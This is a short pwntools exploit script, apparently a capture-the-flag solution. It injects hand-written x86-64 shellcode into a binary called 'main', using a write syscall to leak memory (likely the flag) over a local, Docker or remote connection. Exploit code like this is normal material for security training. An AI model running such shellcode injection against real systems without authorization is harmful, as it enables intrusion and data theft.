#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('main')
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("172.17.0.2", 5000)
        time.sleep(1)
        pid = process(["pidof", "main"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
brva 0x0134E 
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    sc = asm(
        """
        lea rsi, [rsp]
        sub rsi, 0x100
        mov rsi, [rsi]
        add rsi, 8
        mov rsi, [rsi]
        mov rdx, 0x50
        mov rdi, 1
        mov rax, 1
        syscall
        """
    )

    io.sendafter(b">", sc)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

